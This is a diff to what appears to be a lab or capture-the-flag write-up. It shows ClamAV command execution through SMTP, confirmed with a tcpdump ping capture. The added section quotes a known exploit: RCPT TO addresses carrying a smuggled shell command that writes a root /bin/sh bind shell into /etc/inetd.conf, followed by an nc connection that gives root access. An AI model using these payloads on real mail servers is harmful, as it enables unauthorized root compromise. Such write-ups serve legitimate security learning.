@@ -74,7 +74,7 @@ data
 250 2.0.0 22S1VZ2e004005 Message accepted for delivery
 ```
 
-Locally, we see (we start tcpdump before we perform the exploit):
+Locally (we start tcpdump before we perform the exploit), we see:
 
 ```shell-session
 $ sudo tcpdump -i eth0 icmp
@@ -85,3 +85,15 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 17:32:46.244017 IP 192.168.52.42 > 192.168.52.200: ICMP echo request, id 43279, seq 2, length 64
 17:32:46.244035 IP 192.168.52.200 > 192.168.52.42: ICMP echo reply, id 43279, seq 2, length 64
 ```
+
+If we check searchsploit for ClamAV, we find an [exploit](https://www.exploit-db.com/exploits/4761) for this vulnerability which uses the following SMTP commands:
+
+```
+mail from: <>
+rcpt to: <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"@localhost>
+rcpt to: <nobody+"|/etc/init.d/inetd restart"@localhost>
+data
+.
+```
+
+Now if we `nc -nv 192.168.52.42 31337`, we have a root shell.
